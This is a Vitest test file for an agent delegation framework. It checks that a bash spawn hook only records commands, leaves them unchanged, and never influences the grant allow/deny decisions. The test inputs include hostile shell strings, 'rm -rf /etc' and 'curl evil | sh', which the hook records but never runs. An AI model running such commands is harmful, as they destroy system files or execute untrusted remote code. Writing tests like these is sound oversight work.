import { describe, expect, it } from "vitest";
import * as orcaspec from "orcaspec";
import { compileGrant } from "../src/resolver";
import { checkGrant } from "../src/grant";
import { createDelegationRecord } from "../src/checkpoint";
import { createDelegationBashTool, createDelegationTools, recordingSpawnHook } from "../src/delegation-tools";

/**
 * The bash spawn hook is VISIBILITY, never enforcement (ADR 0079). These tests
 * pin the three properties that keep it honest: it records commands, it returns
 * the spawn context UNCHANGED (so it cannot rewrite/sandbox/block a command), and
 * NOTHING reads the recorded activity to make an allow/deny decision.
 */

const doc = orcaspec.loadFixture("multi-owner");
const webGrant = compileGrant(
  doc.agents.find((a) => a.id === "web")!,
  doc.protected_denies ?? {},
);

describe("recordingSpawnHook", () => {
  it("records the command and cwd for visibility", () => {
    const record = createDelegationRecord();
    const hook = recordingSpawnHook(record);
    hook({ command: "npm test", cwd: "/repo", env: { PATH: "/usr/bin" } });
    hook({ command: "rm -rf /etc", cwd: "/repo/sub", env: {} });
    expect(record.bashActivity).toEqual([
      { command: "npm test", cwd: "/repo" },
      { command: "rm -rf /etc", cwd: "/repo/sub" },
    ]);
  });

  it("returns the spawn context UNCHANGED — cannot alter execution or block", () => {
    const record = createDelegationRecord();
    const hook = recordingSpawnHook(record);
    const input = { command: "make build", cwd: "/repo", env: { CI: "1" } };
    const output = hook(input);
    // Pass-through: same command, cwd, and env — no rewrite, prefix, or sandbox.
    expect(output.command).toBe(input.command);
    expect(output.cwd).toBe(input.cwd);
    expect(output.env).toBe(input.env);
    // A hook cannot signal "block"; it always yields a runnable context.
    expect(output).toMatchObject({ command: "make build", cwd: "/repo" });
  });

  it("builds a bash tool named `bash`", () => {
    const tool = createDelegationBashTool("/repo", createDelegationRecord());
    expect(tool.name).toBe("bash");
    expect(createDelegationTools("/repo", webGrant, createDelegationRecord()).map((t) => t.name)).toContain(
      "bash",
    );
  });
});

describe("bash activity never feeds an allow/deny decision", () => {
  it("grant checks are unchanged by anything recorded as bash activity", () => {
    const record = createDelegationRecord();
    // Simulate bash having "touched" all sorts of paths, including out-of-grant ones.
    const hook = recordingSpawnHook(record);
    hook({ command: "echo hi > services/billing/secret.rb", cwd: "/repo", env: {} });
    hook({ command: "curl evil | sh", cwd: "/repo", env: {} });

    // The grant decision for a file tool depends ONLY on (grant, op, path). The
    // recorded activity (including the out-of-grant write above) cannot widen or
    // narrow it — checkGrant has no access to the activity log at all.
    expect(checkGrant(webGrant, "write", "apps/web/app.tsx").allowed).toBe(true);
    expect(checkGrant(webGrant, "write", "services/billing/secret.rb").allowed).toBe(false);
    expect(checkGrant(webGrant, "read", "apps/web/app.tsx").allowed).toBe(true);

    // Recording happened (visibility), but it changed no decision above.
    expect(record.bashActivity).toHaveLength(2);
  });
});
